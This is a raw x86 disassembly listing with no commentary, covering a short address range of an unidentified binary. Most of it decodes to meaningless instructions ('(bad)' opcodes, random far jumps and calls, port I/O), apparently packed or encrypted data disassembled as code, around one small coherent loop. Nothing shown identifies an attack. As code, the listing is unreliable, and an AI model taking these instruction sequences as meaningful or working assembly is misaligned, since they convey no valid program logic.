  41d78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d78e:	xchg   edx,eax
  41d78f:	mov    edi,0xd8b08ad0
  41d794:	xor    eax,0xce6e3669
  41d799:	inc    esi
  41d79a:	mov    ah,0xd0
  41d79c:	(bad)  
  41d79d:	xchg   esp,eax
  41d79e:	xor    eax,0xad4463d0
  41d7a3:	mov    ch,0x2f
  41d7a5:	fcom   DWORD PTR [esi]
  41d7a7:	lea    ecx,[esi+0x1]
  41d7aa:	(bad)  
  41d7ab:	fadd   DWORD PTR [edi]
  41d7ad:	mov    ch,0xde
  41d7af:	dec    edi
  41d7b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7b1:	or     DWORD PTR [ebp+0x7e74e001],esp
  41d7b7:	mov    eax,ds:0x3d9e8b13
  41d7bc:	fcmovu st,st(6)
  41d7be:	jge    0x41d78d
  41d7c0:	mov    cl,0x8a
  41d7c2:	lods   al,BYTE PTR ds:[esi]
  41d7c3:	jno    0x41d7da
  41d7c5:	mov    al,ds:0xf4bb2cd2
  41d7ca:	xchg   edx,eax
  41d7cb:	push   cs
  41d7cc:	jmp    0x495dd412
  41d7d1:	(bad)  ds:0x86a7a1f0
  41d7d7:	cwde   
  41d7d8:	sub    DWORD PTR [esi-0x6e],0xc5d2db2b
  41d7df:	push   ss
  41d7e0:	lds    esi,FWORD PTR [edx]
  41d7e2:	ret    
  41d7e3:	aas    
  41d7e4:	scas   al,BYTE PTR es:[edi]
  41d7e5:	jp     0x41d7a3
  41d7e7:	popa   
  41d7e8:	in     al,dx
  41d7e9:	enter  0x87fa,0x6f
  41d7ed:	dec    ecx
  41d7ee:	mov    bh,0x48
  41d7f0:	into   
  41d7f1:	mov    dl,0x27
  41d7f3:	lods   al,BYTE PTR ds:[esi]
  41d7f4:	xchg   edi,eax
  41d7f5:	sbb    dh,al
  41d7f7:	divps  xmm1,XMMWORD PTR [ebx]
  41d7fa:	jp     0x41d801
  41d7fc:	adc    BYTE PTR [eax],dl
  41d7fe:	rol    esp,0xf9
  41d801:	mov    esi,0xd1cbd38d
  41d806:	inc    edx
  41d807:	js     0x41d829
  41d809:	inc    ebx
  41d80a:	inc    eax
  41d80b:	pop    esi
  41d80c:	dec    ecx
  41d80d:	sbb    ecx,DWORD PTR [esi+0x6efd5a8a]
  41d813:	addr16 daa 
  41d815:	aad    0x5b
  41d817:	pop    ebx
  41d818:	fisttp QWORD PTR [esi+eiz*4]
  41d81b:	mov    al,ds:0xf4284ad1
  41d820:	test   BYTE PTR [edx],0x5c
  41d823:	sbb    eax,0x6d7654ad
  41d828:	push   eax
  41d829:	xor    eax,0x2b398c0f
  41d82e:	shl    BYTE PTR [ebp+ebp*1+0x71f9b290],1
  41d835:	xor    DWORD PTR [esi],esi
  41d837:	sub    BYTE PTR es:[esi],cl
  41d83a:	int3   
  41d83b:	xor    al,0x6c
  41d83d:	mov    DWORD PTR [ebx],ebx
  41d83f:	mov    ecx,0xf7003aaa
  41d844:	ds xchg esi,eax
  41d846:	sbb    bl,ah
  41d848:	out    dx,eax
  41d849:	and    eax,0x5a28cf2
  41d84e:	mov    bl,0xd6
  41d850:	mov    ebx,0x14c36186
  41d855:	cld    
  41d856:	inc    eax
  41d857:	lods   eax,DWORD PTR ds:[esi]
  41d858:	and    dh,BYTE PTR [eax+ebx*1]
  41d85b:	mov    BYTE PTR [esi+0x8],ch
  41d85e:	jnp    0x41d7ea
  41d860:	lods   eax,DWORD PTR ds:[esi]
  41d861:	inc    ecx
  41d862:	add    BYTE PTR [esi+ecx*2],0xca
  41d866:	cld    
  41d867:	jl     0x41d889
  41d869:	dec    ebx
  41d86a:	mov    eax,ds:0xd786ad6b
  41d86f:	popa   
  41d870:	cmp    ecx,DWORD PTR ds:0xebae12aa
  41d876:	mov    ecx,0xee59b79e
  41d87b:	div    DWORD PTR [ebp-0x25]
  41d87e:	xchg   ebx,eax
  41d87f:	cmp    bl,BYTE PTR [edi+ebx*1+0x7e]
  41d883:	sti    
  41d884:	lods   eax,DWORD PTR ds:[esi]
  41d885:	xchg   esi,eax
  41d886:	popa   
  41d887:	(bad)  
  41d889:	dec    edx
  41d88a:	repnz outs dx,DWORD PTR ds:[esi]
  41d88c:	and    al,0xf3
  41d88e:	pop    edx
  41d88f:	mov    ah,0x24
  41d891:	hlt    
  41d892:	lods   eax,DWORD PTR ds:[esi]
  41d893:	and    BYTE PTR [edi],ah
  41d895:	data16 in al,0x60
  41d898:	add    eax,0x2bcd95
  41d89d:	or     DWORD PTR [edi],edi
  41d89f:	iret   
  41d8a0:	in     eax,0x44
  41d8a2:	aam    0xe7
  41d8a4:	push   ds
  41d8a5:	push   esi
  41d8a6:	out    dx,eax
  41d8a7:	cwde   
  41d8a8:	mov    ds:0xa20e8b35,eax
  41d8ad:	push   esp
  41d8ae:	shl    BYTE PTR [ebx+0xf0243bd],cl
  41d8b4:	scas   al,BYTE PTR es:[edi]
  41d8b5:	push   ss
  41d8b6:	mov    eax,0xe6d259aa
  41d8bb:	push   ecx
  41d8bc:	inc    DWORD PTR [edi+eiz*2+0x5d]
  41d8c0:	jg     0x41d8da
  41d8c2:	clc    
  41d8c3:	ins    BYTE PTR es:[edi],dx
  41d8c4:	pop    ebp
  41d8c5:	mov    eax,ds:0x46a00ebc
  41d8ca:	test   eax,0x2fa0c894
  41d8cf:	fld    TBYTE PTR [ebp+edi*2+0x3c]
  41d8d3:	jp     0x41d864
  41d8d5:	cdq    
  41d8d6:	ins    BYTE PTR es:[edi],dx
  41d8d7:	mov    bl,0xe1
  41d8d9:	sub    al,0x87
  41d8db:	pop    ebp
  41d8dc:	xchg   BYTE PTR [edi+eiz*2-0x6b9ea553],bl
  41d8e3:	in     eax,dx
  41d8e4:	dec    ebp
  41d8e5:	fld    QWORD PTR [eax+0x2a]
  41d8e8:	dec    esi
  41d8e9:	out    0x86,eax
  41d8eb:	out    dx,eax
  41d8ec:	inc    edi
  41d8ed:	xlat   BYTE PTR ds:[ebx]
  41d8ee:	jnp    0x41d963
  41d8f0:	js     0x41d8ec
  41d8f2:	push   eax
  41d8f3:	into   
  41d8f4:	adc    cl,BYTE PTR [eax]
  41d8f6:	fiadd  DWORD PTR [edi+0x7e0e3af5]
  41d8fc:	pop    es
  41d8fd:	ret    
  41d8fe:	sub    esi,DWORD PTR [eax+0x60e27155]
  41d904:	jns    0x41d88a
  41d906:	in     eax,dx
  41d907:	push   edx
  41d908:	loope  0x41d95f
  41d90a:	call   0x899c18ae
  41d90f:	inc    edi
  41d910:	inc    ebx
  41d911:	sbb    al,0x87
  41d913:	pop    edi
  41d914:	and    eax,DWORD PTR [edi+0x61]
  41d917:	add    ch,BYTE PTR [eax+eiz*8]
  41d91a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d91b:	inc    esp
  41d91c:	les    eax,FWORD PTR ds:0xa9595992
  41d922:	shl    BYTE PTR [edx-0x1b435174],0x73
  41d929:	xor    DWORD PTR es:[ecx],esi
  41d92c:	call   0x922b:0x81a81e5f
  41d933:	mov    DWORD PTR [ecx+0x6c],0x9934b639
  41d93a:	mov    al,0x47
  41d93c:	push   0xe0f11555
  41d941:	jo     0x41d923
  41d943:	sub    al,0xc
  41d945:	and    eax,0x29cdbe18
  41d94a:	add    ebp,DWORD PTR [ebp-0x11]
  41d94d:	sub    al,0x11
  41d94f:	sbb    eax,DWORD PTR [edi]
  41d951:	test   DWORD PTR [esi+0x48],ebx
  41d954:	jo     0x41d94f
  41d956:	jmp    0x41d93c
  41d958:	lock xchg esi,eax
  41d95a:	inc    edx
  41d95b:	(bad)  
  41d95c:	outs   dx,BYTE PTR ds:[esi]
  41d95d:	or     ebx,DWORD PTR [esi+esi*4]
  41d960:	xor    al,ah
  41d962:	lods   al,BYTE PTR ds:[esi]
  41d963:	loopne 0x41d969
  41d965:	mov    cs,WORD PTR ds:0x616f64ee
  41d96b:	jae    0x41d8f7
  41d96d:	or     DWORD PTR ds:0xaddfafc,eax
  41d973:	mov    ds:0xc41a558b,al
  41d978:	cwde   
  41d979:	shl    BYTE PTR [ecx],1
  41d97b:	mov    ds:0x9a064ff8,al
  41d980:	ret    0x17e4
  41d983:	add    cl,BYTE PTR [esi-0xf]
  41d986:	pop    edi
  41d987:	add    eax,0x5ba6b055
  41d98c:	mov    dl,0x8e
  41d98e:	out    0x5b,eax
  41d990:	xor    eax,0x69aed90
  41d995:	das    
  41d996:	retf   
  41d997:	push   edx
  41d998:	in     eax,dx
  41d999:	inc    ebx
  41d99a:	sub    eax,esp
  41d99c:	add    BYTE PTR [ecx+edi*2+0x18792eb4],0x1f
  41d9a4:	sbb    esi,DWORD PTR [eax-0x72]
  41d9a7:	jmp    0x7780c0cf
  41d9ac:	outs   dx,BYTE PTR ds:[esi]
  41d9ad:	dec    edi
  41d9ae:	nop
  41d9af:	add    esi,DWORD PTR [ebx-0xfddf23d]
  41d9b5:	cli    
  41d9b6:	xor    al,0xca
  41d9b8:	fimul  DWORD PTR [esi+0x55]
  41d9bb:	dec    edx
  41d9bc:	lods   al,BYTE PTR ds:[esi]
  41d9bd:	or     DWORD PTR [ebx-0x223a72c],ecx
  41d9c3:	jo     0x41da31
  41d9c5:	mov    cl,0xc6
  41d9c7:	cmp    DWORD PTR [edi-0x5a],ebx
  41d9ca:	imul   edi,DWORD PTR [eax+eax*8],0x4a
  41d9ce:	loope  0x41d95e
  41d9d0:	leave  
  41d9d1:	jl     0x41d9b5
  41d9d3:	lds    esp,FWORD PTR [ebp+0x21]
  41d9d6:	jae    0x41da54
  41d9d8:	cs out dx,al
  41d9da:	push   ebp
  41d9db:	pop    ebp
  41d9dc:	push   edi
  41d9dd:	(bad)
  41d9e0:	out    0x22,eax
  41d9e2:	jmp    0x41d99c
  41d9e4:	inc    eax
  41d9e5:	or     DWORD PTR [eax-0xd30eb0],ebx
  41d9eb:	jl     0x41d9ee
  41d9ed:	mov    eax,0x43b5c14c
  41d9f2:	sbb    dl,BYTE PTR [ecx-0x5f]
  41d9f5:	fld    DWORD PTR [ebp+edi*2+0x52cba533]
  41d9fc:	cwde   
  41d9fd:	js     0x41d98b
  41d9ff:	jmp    0xeefee520
  41da04:	adc    esi,0xe9e0fd34
  41da0a:	cmp    cl,BYTE PTR [ebx]
  41da0c:	mov    ds:0xfe80d05e,eax
  41da11:	add    ah,bh
  41da13:	xchg   esi,eax
  41da14:	mov    eax,DWORD PTR [ecx]
  41da16:	mov    DWORD PTR [esi+0x43784fde],ebx
  41da1c:	loope  0x41da53
  41da1e:	sahf   
  41da1f:	mov    al,0xdc
  41da21:	jb     0x41da43
  41da23:	aam    0xe
  41da25:	inc    edx
  41da26:	adc    al,bl
  41da28:	cmc    
  41da29:	scas   al,BYTE PTR es:[edi]
  41da2a:	cmp    ebx,ecx
  41da2c:	inc    ebp
  41da2d:	nop
  41da2e:	inc    esp
  41da2f:	fmul   DWORD PTR [ebx-0x74]
  41da32:	test   eax,0xd4b0e26e
  41da37:	push   0x54d6a9bb
  41da3c:	js     0x41da65
  41da3e:	push   0x4545c63b
  41da43:	add    ecx,edi
  41da45:	call   0xafa8218e
  41da4a:	jno    0x41da84
  41da4c:	or     ch,dl
  41da4e:	ss out 0xe8,al
  41da51:	inc    esp
  41da52:	xor    ch,BYTE PTR [ebx-0x1e885ef7]
  41da58:	xchg   ebp,eax
  41da59:	leave  
  41da5a:	jge    0x41d9f0
  41da5c:	repnz sahf 
  41da5e:	jns    0x41da62
  41da60:	inc    BYTE PTR [ebx-0x1e]
  41da63:	adc    edi,DWORD PTR [ecx-0x7a]
  41da66:	iret   
  41da67:	jecxz  0x41dad6
  41da69:	inc    edi
  41da6a:	fisttp QWORD PTR [edi-0x2eef2b]
  41da70:	shl    BYTE PTR [ecx-0x31],1
  41da73:	arpl   WORD PTR [edx+0x13529153],dx
  41da79:	inc    esp
  41da7a:	push   esi
  41da7b:	repnz mov al,ds:0x8203da55
  41da81:	mov    edx,es
  41da83:	div    DWORD PTR [ebx+0x3f]
  41da86:	mov    esi,0x4f3780a6
  41da8b:	xor    bl,BYTE PTR [esi]
  41da8d:	std    
  41da8e:	cmp    al,0xb9
  41da90:	lahf   
  41da91:	rol    BYTE PTR fs:[ebx-0x74fe9e11],cl
  41da98:	aaa    
  41da99:	mov    cl,0x54
  41da9b:	sub    ebp,0xd99a1ef7
  41daa1:	out    dx,eax
  41daa2:	push   0xffffff80
  41daa4:	nop
  41daa5:	outs   dx,BYTE PTR ds:[esi]
  41daa6:	mov    al,0x54
  41daa8:	xor    cl,BYTE PTR [ebx-0x5b07eef2]
  41daae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daaf:	(bad)  
  41dab0:	shl    ecx,cl
  41dab2:	(bad)  
  41dab4:	and    ebx,0x7a371d
  41daba:	sbb    BYTE PTR [ecx+0x2f],al
  41dabd:	outs   dx,DWORD PTR ds:[esi]
  41dabe:	sar    DWORD PTR [eax+0x3ea74a7b],cl
  41dac4:	xor    eax,DWORD PTR [esi]
  41dac6:	sbb    DWORD PTR [ecx],esi
  41dac8:	psubusb mm6,mm0
  41dacb:	cli    
  41dacc:	loopne 0x41da88
  41dace:	mov    edx,0xf00abed4
  41dad3:	int3   
  41dad4:	adc    BYTE PTR [ebp+0x3f],al
  41dad7:	inc    esp
  41dad8:	and    al,BYTE PTR [ecx-0x33e303f8]
  41dade:	fsubr  DWORD PTR [edx-0x3b]
  41dae1:	xchg   edi,eax
  41dae2:	scas   al,BYTE PTR es:[edi]
  41dae3:	sbb    ecx,ecx
  41dae5:	mov    ebx,DWORD PTR [edx+edx*4-0x50]
  41dae9:	xlat   BYTE PTR ds:[ebx]
  41daea:	jne    0x41db35
  41daec:	fild   QWORD PTR ds:0x9794d0ab
  41daf2:	rcl    cl,0xf
  41daf5:	cli    
  41daf6:	push   esp
  41daf7:	shl    BYTE PTR [edx],1
  41daf9:	shl    BYTE PTR [ebx+0x15],cl
  41dafc:	inc    esp
  41dafd:	jno    0x41da81
  41daff:	mov    bl,0x3b
  41db02:	pop    ebx
  41db03:	retf   
  41db04:	mov    edi,DWORD PTR [edx-0x38]
  41db07:	jg     0x41db01
  41db09:	jl     0x41daaa
  41db0b:	test   eax,esp
  41db0d:	retf   
  41db0e:	push   0xffffffa3
  41db10:	sub    DWORD PTR [edi+0x15425cd3],esp
  41db16:	shl    BYTE PTR [esi],0x96
  41db19:	xchg   ebx,edx
  41db1b:	push   ds
  41db1c:	in     eax,0xb0
  41db1e:	ins    BYTE PTR es:[edi],dx
  41db1f:	es sbb al,0xd8
  41db22:	xor    esp,DWORD PTR [ebp-0x49c8ad6]
  41db28:	mov    ebp,eax
  41db2a:	addr16 mov ch,0xe0
  41db2d:	retf   
  41db2e:	lock and ebx,DWORD PTR [esi]
  41db31:	sbb    dl,BYTE PTR [ebp-0x138dc14a]
  41db37:	mov    cl,0x54
  41db39:	shl    BYTE PTR [eax+0x7d76fbcc],cl
  41db3f:	mov    al,0xb5
  41db41:	fstp   DWORD PTR [ebx+0x6014588e]
  41db47:	mov    ebp,0x770208f1
  41db4c:	fsub   DWORD PTR [edx+0x3cb2ba36]
  41db52:	jo     0x41db12
  41db54:	add    DWORD PTR [edx-0x12a2ea49],ebx
  41db5a:	popa   
  41db5b:	cli    
  41db5c:	call   FWORD PTR [edx+0x3840fa09]
  41db62:	and    al,BYTE PTR [ebp+0x79087172]
  41db68:	push   cs
  41db69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db6a:	into   
  41db6b:	js     0x41db7a
  41db6d:	aas    
  41db6e:	loopne 0x41db7d
  41db70:	add    cl,dh
  41db72:	mov    ds:0x4fc9754d,al
  41db77:	push   esp
  41db78:	and    BYTE PTR [esi-0x45],dh
  41db7b:	scas   eax,DWORD PTR es:[edi]
  41db7c:	test   eax,0x9920e385
  41db81:	idiv   DWORD PTR [edx]
  41db83:	xchg   ecx,eax
  41db84:	es aad 0x5b
  41db87:	test   DWORD PTR [edi+0x4e],ebp
  41db8a:	inc    edi
  41db8b:	xchg   DWORD PTR [esi],edx
  41db8d:	popf   
  41db8e:	arpl   WORD PTR [ebx-0x27],ax
  41db91:	inc    ecx
  41db92:	inc    eax
  41db93:	or     BYTE PTR [esi+edx*8],0xe1
  41db97:	pop    edi
  41db98:	(bad)  
  41db99:	sti    
  41db9a:	xchg   esi,eax
  41db9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db9c:	je     0x41db43
  41db9e:	gs mov ch,0xba
  41dba1:	sub    BYTE PTR [edx+0x17],ch
  41dba4:	mov    ebx,DWORD PTR [edx]
  41dba6:	sti    
  41dba7:	mov    ch,0x35
  41dba9:	sub    edi,esp
  41dbab:	mov    ah,bl
  41dbad:	xor    dl,BYTE PTR [esi-0x5381ee6f]
  41dbb3:	aaa    
  41dbb4:	or     eax,0x624399f8
  41dbb9:	mov    al,gs:0x33b0dab2
  41dbbf:	iret   
  41dbc0:	in     eax,dx
  41dbc1:	rcl    eax,cl
  41dbc3:	mov    gs,edi
  41dbc5:	and    dl,bh
  41dbc7:	(bad)  
  41dbc8:	or     eax,0x17f18237
  41dbcd:	pop    esp
  41dbce:	dec    esi
  41dbcf:	jl     0x41dbdc
  41dbd1:	cld    
  41dbd2:	pop    ecx
  41dbd3:	cmp    ebp,DWORD PTR [edi+0x1ed799be]
  41dbd9:	(bad)
  41dbdd:	xor    al,0x61
  41dbdf:	aam    0x81
  41dbe1:	inc    esp
  41dbe2:	push   0xb5663286
  41dbe7:	or     al,0xbc
  41dbe9:	add    dh,BYTE PTR [edi]
  41dbeb:	adc    esp,DWORD PTR ds:[esi+0x45891344]
  41dbf2:	lock mov ecx,DWORD PTR ds:0x42b1de
  41dbf9:	and    DWORD PTR ds:0x42b212,ecx
  41dbff:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  41dc06:	mov    eax,DWORD PTR [ebp-0x18]
  41dc09:	mov    DWORD PTR ds:0x42b19a,0x12
  41dc13:	cmp    DWORD PTR ds:0x42b19a,0x0
  41dc1a:	je     0x41fffa
  41dc20:	cmp    DWORD PTR ds:0x42b19a,0x4
  41dc27:	jle    0x41fffa
  41dc2d:	jmp    0x41dc3b
  41dc32:	push   DWORD PTR [ebp-0x18]
  41dc35:	call   DWORD PTR ds:0x42b2f2
  41dc3b:	cmp    DWORD PTR ds:0x42b19a,0x5
  41dc42:	jne    0x41dc57
  41dc48:	xor    ecx,ecx
  41dc4a:	add    ecx,DWORD PTR ds:0x42b19a
  41dc50:	dec    ecx
  41dc51:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc57:	mov    ecx,DWORD PTR ds:0x42b19a
  41dc5d:	dec    ecx
  41dc5e:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc64:	jmp    0x41dc13
  41dc69:	jmp    0x41fffa
  41dc6e:	push   cs
  41dc6f:	mov    BYTE PTR [edi-0x79d57893],0x82
  41dc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc77:	mov    dl,0xfb
  41dc79:	cs jnp 0x41dc34
  41dc7c:	lea    ecx,[ebx-0x7c7f2486]
  41dc82:	divps  xmm0,XMMWORD PTR [ebx+0x637bfb83]
  41dc89:	xchg   edx,eax
  41dc8a:	mov    cs,WORD PTR [ecx]
  41dc8c:	ret    0x64b3
  41dc8f:	int3   
  41dc90:	fldcw  WORD PTR [ebp-0x6c]
  41dc93:	repnz stos BYTE PTR es:[edi],al
  41dc95:	jl     0x41dc70
  41dc97:	ds pop esi
  41dc99:	xor    esp,DWORD PTR [ebp+0x66e86962]
  41dc9f:	sub    bl,ch
  41dca1:	cmp    DWORD PTR [edi],0x651a42dd
  41dca7:	fucomip st,st(2)
  41dca9:	ds xchg esi,eax
  41dcab:	and    al,0x57
  41dcad:	in     al,0xb4
  41dcaf:	mov    edx,DWORD PTR [ebx-0x2abce7f9]
  41dcb5:	mov    eax,ds:0x9aad5440
  41dcba:	iret   
  41dcbb:	imul   esp,DWORD PTR [edi+eax*2],0xffffffb9
  41dcbf:	xchg   edi,eax
  41dcc0:	xrelease mov BYTE PTR [ecx],al
  41dcc3:	adc    cl,BYTE PTR [ebp-0x55]
  41dcc6:	push   edi
  41dcc7:	jecxz  0x41dc83
  41dcc9:	add    ch,BYTE PTR [ebx]
  41dccb:	test   DWORD PTR [esi+0xb],ebx
  41dcce:	mov    ch,0x2e
  41dcd0:	inc    esi
  41dcd1:	stos   DWORD PTR es:[edi],eax
  41dcd2:	les    edi,FWORD PTR [edx+esi*4]
  41dcd5:	ss dec eax
  41dcd7:	cmp    BYTE PTR [eax+0x1440fe3],0x1b
  41dcde:	jmp    0x6b95:0x3ddfc475
  41dce5:	mov    edi,0x11a69c80
  41dcea:	rol    DWORD PTR [edi-0x6bff6cbd],1
  41dcf0:	mov    ebp,0xd6533144
  41dcf5:	sub    BYTE PTR [esp+edi*2-0x5],0x1a
  41dcfa:	sahf   
  41dcfb:	addr16 loop 0x41dd45
  41dcfe:	fiadd  DWORD PTR [edx-0x4d198ac1]
  41dd04:	sbb    al,0x70
  41dd06:	dec    eax
  41dd07:	mov    edi,0xdbddb090
  41dd0c:	push   ds
  41dd0d:	loope  0x41dcef
  41dd0f:	or     eax,DWORD PTR ds:0x47402e11
  41dd15:	pushf  
  41dd16:	or     ch,BYTE PTR [esi+0x40027124]
  41dd1c:	jecxz  0x41dcf4
  41dd1e:	std    
  41dd1f:	adc    cl,BYTE PTR [eax]
  41dd21:	gs std 
  41dd23:	fstp   TBYTE PTR [edi+0x525595cd]
  41dd29:	add    ecx,DWORD PTR [eax]
  41dd2b:	jle    0x41dd99
  41dd2d:	cdq    
  41dd2e:	fwait
  41dd2f:	add    cl,BYTE PTR [eax+edx*8+0x1ef1d8f1]
  41dd36:	inc    ecx
  41dd37:	fnsave [ebx+0x147a96ce]
  41dd3d:	(bad)  
  41dd3e:	xchg   ebp,eax
  41dd3f:	nop
  41dd40:	imul   esi,DWORD PTR [eax+0x2abd6037],0x7b
  41dd47:	out    dx,eax
  41dd48:	scas   al,BYTE PTR es:[edi]
  41dd49:	dec    edx
  41dd4a:	push   0xfffffff3
  41dd4c:	pop    ebx
  41dd4d:	pop    esi
  41dd4e:	add    cl,BYTE PTR [eax-0x577094ce]
  41dd54:	cmp    al,0xe1
  41dd56:	pusha  
  41dd57:	dec    ecx
  41dd59:	bound  ebx,QWORD PTR [edx+edi*1-0x13e9fe09]
  41dd60:	cld    
  41dd61:	or     DWORD PTR [esi],ebx
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	mov    BYTE PTR [ebx-0x468f815a],bh
  41dd6a:	jnp    0x41dd6b
  41dd6c:	xchg   BYTE PTR [eax],bl
  41dd6e:	retf   
  41dd6f:	mov    dh,0xdf
  41dd71:	imul   ecx,DWORD PTR [ecx+eiz*1],0x458eb208
  41dd78:	and    ebx,DWORD PTR [ecx+0x22]
  41dd7b:	scas   eax,DWORD PTR es:[edi]
  41dd7c:	dec    ebp
  41dd7d:	dec    esi
  41dd7e:	lock xchg esi,eax
  41dd80:	je     0x41dd07
  41dd82:	sbb    BYTE PTR [edx-0x7e96517b],al
  41dd88:	test   DWORD PTR [ebx],ebx
  41dd8a:	sub    DWORD PTR [esi],0x98e941e8
  41dd90:	jp     0x41dd70
  41dd92:	mov    bh,0x4e
  41dd94:	pop    ebx
  41dd95:	push   ds
  41dd96:	pop    esp
  41dd97:	cdq    
  41dd98:	outs   dx,BYTE PTR ds:[esi]
  41dd99:	(bad)  
  41dd9b:	test   al,0x75
  41dd9d:	sub    ecx,DWORD PTR [ecx+0x7f]
  41dda0:	call   0xa111fa04
  41dda5:	fild   WORD PTR [ebx-0x5a]
  41dda8:	outs   dx,BYTE PTR ds:[esi]
  41dda9:	sbb    al,0xb8
  41ddab:	sahf   
  41ddac:	stos   DWORD PTR es:[edi],eax
  41ddad:	xor    BYTE PTR [edi],ch
  41ddaf:	and    BYTE PTR [ecx],ah
  41ddb1:	aas    
  41ddb2:	xor    BYTE PTR ds:0x22428847,ah
  41ddb8:	into   
  41ddb9:	mov    edi,0xf4c49854
  41ddbe:	cmp    al,0xd1
  41ddc0:	cmp    ch,BYTE PTR [edx]
  41ddc2:	es icebp 
  41ddc4:	xchg   edi,eax
  41ddc5:	sbb    eax,eax
  41ddc7:	pop    ecx
  41ddc8:	cvtdq2ps xmm4,XMMWORD PTR [esi+0x3bfe753c]
  41ddcf:	test   al,0xa7
  41ddd1:	retf   0xd55e
  41ddd4:	fsub   QWORD PTR [edx+edi*1-0x266ed263]
  41dddb:	mov    al,ds:0xc04d7ae
  41dde0:	into   
  41dde1:	nop
  41dde2:	inc    eax
  41dde3:	bnd ret 
  41dde5:	pop    ebp
  41dde6:	loopne 0x41de48
  41dde8:	or     al,0x7
  41ddea:	xchg   ecx,eax
  41ddeb:	sub    bl,BYTE PTR [ecx+ebp*4+0x72257cc9]
  41ddf2:	pop    ebx
  41ddf3:	rcl    DWORD PTR [eax+0x55],0x6e
  41ddf7:	inc    esp
  41ddf8:	sub    eax,0xa91b95e9
  41ddfd:	dec    edx
  41ddfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddff:	shl    BYTE PTR [edx+0x6a],0x5a
  41de03:	sub    al,0xfc
  41de05:	push   ds
  41de06:	push   ds
  41de07:	dec    esp
  41de08:	push   es
  41de09:	shl    DWORD PTR [ecx+0x125f0596],0x79
  41de10:	jae    0x41de78
  41de12:	dec    esp
  41de13:	adc    bl,BYTE PTR [eax-0x4024c654]
  41de19:	gs icebp 
  41de1b:	push   ebp
  41de1c:	adc    BYTE PTR [esi+edi*4+0x78],bh
  41de20:	and    eax,0x2866847d
  41de25:	call   0xfa65:0xbb362bcf
  41de2c:	or     bh,BYTE PTR [ecx+0x5b14f570]
  41de32:	pop    ss
  41de33:	test   DWORD PTR [edx],esi
  41de35:	jb     0x41de98
  41de37:	add    BYTE PTR [esp+edi*4-0x7f],al
  41de3b:	sub    eax,0x8a1a3656
  41de40:	popf   
  41de41:	inc    ebx
  41de42:	ficomp WORD PTR [eax]
  41de44:	jmp    0xd809:0x719b7eba
  41de4b:	mov    bh,BYTE PTR [edx]
  41de4d:	inc    esi
  41de4e:	jmp    0x41decb
  41de50:	adc    BYTE PTR [edx+0x1d],cl
  41de53:	xor    eax,0xfd7f8ac0
  41de58:	stos   BYTE PTR es:[edi],al
  41de59:	jg     0x41dec6
  41de5b:	shl    DWORD PTR [ecx-0x44],0xc6
  41de5f:	adc    BYTE PTR [eax+0x7c],al
  41de62:	ror    BYTE PTR [edx-0x5179e075],0x89
  41de69:	call   0xc9f4:0x9e4c6314
  41de70:	repnz iret 
  41de72:	or     esp,DWORD PTR [esi-0x5abfb358]
  41de78:	mov    es,ebp
  41de7a:	imul   edx,DWORD PTR [esi-0xda4ef07],0x2f4a345d
  41de84:	std    
  41de85:	inc    ecx
  41de86:	mov    ss,WORD PTR [edi]
  41de88:	cdq    
  41de89:	jg     0x41de9d
  41de8b:	lea    esp,[esi]
  41de8d:	mov    eax,ds:0xc4d37000
  41de92:	dec    esi
  41de93:	pop    ebp
  41de94:	mov    WORD PTR [edi-0x71e45a0f],ss
  41de9a:	mov    esp,0xc7f644a3
  41de9f:	mov    ebp,0x7d0070a7
  41dea4:	cwde   
  41dea5:	jns    0x41de89
  41dea7:	lods   al,BYTE PTR ds:[esi]
  41dea8:	fs push ecx
  41deaa:	sbb    eax,0xec3190a0
  41deaf:	hlt    
  41deb0:	dec    esp
  41deb1:	test   BYTE PTR [edi+0x33ab9d9b],ch
  41deb7:	and    BYTE PTR ds:0x6738b0bc,0x2d
  41debe:	push   ebp
  41debf:	cmp    esp,DWORD PTR [ebx]
  41dec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec2:	jne    0x41defa
  41dec4:	aas    
  41dec5:	fiadd  WORD PTR [ebx-0x45]
  41dec8:	and    eax,0xc3ea854c
  41decd:	sahf   
  41dece:	mov    bh,0xe1
  41ded0:	mov    edi,0x9c4ad3f
  41ded5:	(bad)  
  41ded6:	push   cs
  41ded7:	(bad)  
  41ded9:	adc    al,dl
  41dedb:	mov    edi,0x3f5d7991
  41dee0:	pop    ds
  41dee1:	jecxz  0x41def5
  41dee3:	push   ecx
  41dee4:	jmp    0x73895358
  41dee9:	xchg   ebx,eax
  41deea:	stos   BYTE PTR es:[edi],al
  41deeb:	pop    ds
  41deec:	mov    ah,0x8b
  41deee:	sub    al,0x24
  41def0:	xchg   ecx,eax
  41def1:	jae    0x41defc
  41def3:	outs   dx,WORD PTR ds:[esi]
  41def5:	std    
  41def6:	mov    edx,0x31a5d3df
  41defb:	push   ebp
  41defc:	and    DWORD PTR [esi+ebx*4],ebx
  41deff:	and    eax,DWORD PTR [ebx-0x5b20447]
  41df05:	xor    bl,BYTE PTR [esp+edi*4-0x6ede630f]
  41df0c:	or     al,0xc7
  41df0e:	in     al,0x4f
  41df10:	imul   edx,DWORD PTR [eax+0x14],0xffffffea
  41df14:	scas   eax,DWORD PTR es:[edi]
  41df15:	stos   BYTE PTR es:[edi],al
  41df16:	cmp    ch,ah
  41df18:	mov    ebx,0xcb38949b
  41df1d:	push   edi
  41df1e:	cdq    
  41df1f:	test   eax,0xa3a4b6da
  41df24:	popa   
  41df25:	push   0xb3638132
  41df2a:	adc    edi,DWORD PTR [edx-0x75ea7927]
  41df30:	addr16 (bad) 
  41df32:	push   ebp
  41df33:	mov    ah,0xbd
  41df35:	add    BYTE PTR [eax+0x482bf3c],0x2d
  41df3c:	or     DWORD PTR [eax+0x148af3fc],eax
  41df42:	pop    edi
  41df43:	mov    ds:0x3de8e3c5,al
  41df48:	ret    
